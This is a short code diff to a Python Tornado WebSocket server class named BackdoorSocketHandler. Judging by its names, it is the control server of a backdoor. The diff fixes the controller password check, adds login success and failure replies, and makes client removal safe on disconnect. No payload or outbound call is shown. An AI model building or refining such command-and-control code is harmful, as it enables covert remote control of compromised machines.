@@ -50,8 +50,14 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
         if 'id' in msg:
             self.ID = msg['id']
             self.SECRET = b64decode(msg['secret'])
-            if 'pwd' in msg and BackdoorSocketHandler.PASSWORD == self.encrypt(msg['pwd']):
-                self.is_controller = True
+            if 'pwd' in msg:
+                if BackdoorSocketHandler.PASSWORD == self.decrypt(msg['pwd']):
+                    self.is_controller = True
+                    self.send_msg('login success')
+                else:
+                    self.send_msg('login failed')
+                    return
+
             BackdoorSocketHandler.clients.add(self)
             print 'find new client: ' + self.request.remote_ip + '(' + self.ID + ')'
 
@@ -61,7 +67,8 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                 print data
 
     def on_close(self):
-        BackdoorSocketHandler.clients.remove(self)
+        if self in BackdoorSocketHandler.clients:
+            BackdoorSocketHandler.clients.remove(self)
 
 
 def run_server():
